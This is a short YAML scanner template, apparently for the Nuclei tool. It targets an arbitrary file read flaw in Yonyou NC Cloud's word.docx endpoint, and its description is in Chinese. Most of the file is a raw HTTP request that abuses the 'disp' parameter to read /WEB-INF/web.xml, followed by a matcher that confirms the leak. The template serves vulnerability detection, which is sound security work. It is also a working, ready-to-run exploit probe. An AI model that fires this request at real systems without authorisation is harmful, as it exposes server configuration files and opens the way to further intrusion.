id: yonyou-word-lfi
info:
  name: yonyou-word-lfi
  author: apple
  severity: medium
  description: 用友NC Cloud word.docx接口存在任意文件读取漏洞
  reference:
    - https://mp.weixin.qq.com/s/RKAwMJoUivdzuQ6umuPKWw
  tags: yonyou
http:
  - raw:
      - |-
        GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
    matchers:
      - type: word
        part: body
        words:
          - 'servlet-name'
